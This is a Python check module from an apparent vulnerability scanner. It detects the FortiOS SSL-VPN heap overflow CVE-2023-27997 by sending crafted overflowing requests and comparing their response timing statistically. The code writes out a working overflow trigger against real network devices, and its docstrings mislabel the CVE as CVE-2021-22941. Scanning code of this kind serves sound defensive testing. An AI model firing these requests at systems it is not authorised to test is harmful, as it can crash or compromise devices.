"""Agent Asteroid implementation for CVE-2021-22941"""

import hashlib
import re
import struct
from typing import Any
import numpy as np

import requests
from requests import exceptions as requests_exceptions
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from scipy import stats

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "A heap-based buffer overflow vulnerability in FortiOS"
VULNERABILITY_REFERENCE = "CVE-2023-27997"
VULNERABILITY_DESCRIPTION = (
    "A heap-based buffer overflow vulnerability [CWE-122] in FortiOS version 7.2.4 and below, "
    "version 7.0.11 and below, version 6.4.12 and below, version 6.0.16 and below and FortiProxy "
    "version 7.2.3 and below, version 7.0.9 and below, version 2.0.12 and below, version 1.2 all versions, "
    "version 1.1 all versions SSL-VPN may allow a remote attacker to execute arbitrary code or commands "
    "via specifically crafted requests."
)

DEFAULT_TIMEOUT = 90
REQUESTS_PER_GROUP = 400


def _gen_enc_hdr(salt: bytes, size: int) -> str:
    magic = b"GCC is the GNU Compiler Collection."
    ks = hashlib.md5(salt + b"00bfbfbf" + magic).digest()
    length = struct.pack("<H", size)
    return "00bfbfbf{:02x}{:02x}".format(length[0] ^ ks[0], length[1] ^ ks[1])


def _make_request(
    session: requests.Session, baseurl: str, salt: bytes, allocsize: int, reqsize: int
) -> requests.Response:
    payload = _gen_enc_hdr(salt, reqsize) + "41" * allocsize
    payload = "ajax=1&username=test&realm=&enc=" + payload
    req = session.post(
        baseurl + "/remote/hostcheck_validate",
        headers={"content-type": "application/x-www-form-urlencoded"},
        data=payload,
    )
    return req


def _reject_outliers(data: list[int]) -> list[int]:
    # This rejects ~25% of responses, but gives us much better sensitivity by filtering out random spikes in latency
    q3 = np.quantile(data, 0.75)
    return list(filter(lambda x: x <= q3, data))


def _check_stats(regular: list[int], overflow: list[int]) -> tuple[int, int, Any]:
    overflow = _reject_outliers(overflow)
    regular = _reject_outliers(regular)
    t_stat = stats.ttest_ind(overflow, regular, equal_var=False)
    return len(overflow), len(regular), t_stat


@exploits_registry.register
class CVE202327997Exploit(definitions.Exploit):
    """CVE-2021-22941: A heap-based buffer overflow vulnerability in FortiOS."""

    def accept(self, target: definitions.Target) -> bool:
        try:
            req = self.session.get(
                target.origin + "/remote/info", timeout=DEFAULT_TIMEOUT
            )
            reg = re.compile("salt='([0-9a-f]{8})'")
            matches = reg.findall(req.text)
        except requests_exceptions.RequestException:
            return False
        return len(matches) == 1

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        try:
            r = self.session.get(
                target.origin + "/remote/info", timeout=DEFAULT_TIMEOUT
            )
        except requests_exceptions.RequestException:
            return []
        reg = re.compile("salt='([0-9a-f]{8})'")
        matches = reg.findall(r.text)
        salt = matches[0].encode()

        # allocations of size 0xe000+1-0x10000 are all in the same size class
        # we leave a 2KiB gap after our allocation but before the next chunk,
        # so vulnerable devices will only corrupt unused memory
        alloc_size = 0xF800

        overflow = []
        regular = []

        for i in range(REQUESTS_PER_GROUP):
            try:
                req1 = _make_request(
                    self.session, target.origin, salt, alloc_size, alloc_size + 0xF0
                )
            except requests_exceptions.RequestException:
                return []
            overflow.append(req1.elapsed.microseconds)

            try:
                req2 = _make_request(
                    self.session, target.origin, salt, alloc_size, alloc_size // 2
                )
            except requests_exceptions.RequestException:
                return []
            regular.append(req2.elapsed.microseconds)

            if i > 20 and i % 10 == 0:
                nr, no, t = _check_stats(regular, overflow)
                if nr > 20 and no > 20 and t.pvalue < 0.001:
                    break
        _, _, t_stat = _check_stats(regular, overflow)

        if t_stat.pvalue > 0.001 or (-2 < t_stat.statistic < 2):
            return []

        if t_stat.statistic < -0.5:
            return []
        elif t_stat.statistic > 0.5:
            vulnerability = self._create_vulnerability(target.url)
            return [vulnerability]
        else:
            return []

    def _create_vulnerability(self, target_uri: str) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}."
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
        )
        return vulnerability
